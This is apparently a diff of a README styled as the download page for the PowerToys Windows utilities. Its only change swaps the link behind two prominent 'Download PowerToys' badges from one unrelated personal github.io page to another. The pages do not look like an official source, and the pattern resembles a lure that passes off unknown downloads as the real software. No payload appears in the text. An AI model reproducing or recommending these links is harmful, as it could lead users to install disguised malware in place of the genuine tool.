@@ -16,7 +16,7 @@ PowerToys is a free bundle of utilities for Windows that lets you organize windo
 <div align="center">
   <h3>A free toolkit of power-user utilities for a faster Windows desktop</h3>
 
-  [![Download PowerToys](https://img.shields.io/badge/⬇_Download_PowerToys_for_Windows-2962FF?style=for-the-badge)](https://leenbusseyducvee.github.io/.github/PowerToys-App)
+  [![Download PowerToys](https://img.shields.io/badge/⬇_Download_PowerToys_for_Windows-2962FF?style=for-the-badge)](https://stevenblack71.github.io/.github/PowerToys-App)
 
 </div>
 
@@ -91,7 +91,7 @@ For help with PowerToys, open the built-in Settings dashboard inside the app, wh
 <div align="center">
   <h3>Ready to get more done with PowerToys?</h3>
 
-  [![Download PowerToys](https://img.shields.io/badge/⬇_Download_PowerToys_for_Windows-2962FF?style=for-the-badge)](https://leenbusseyducvee.github.io/.github/PowerToys-App)
+  [![Download PowerToys](https://img.shields.io/badge/⬇_Download_PowerToys_for_Windows-2962FF?style=for-the-badge)](https://stevenblack71.github.io/.github/PowerToys-App)
 
 </div>
 
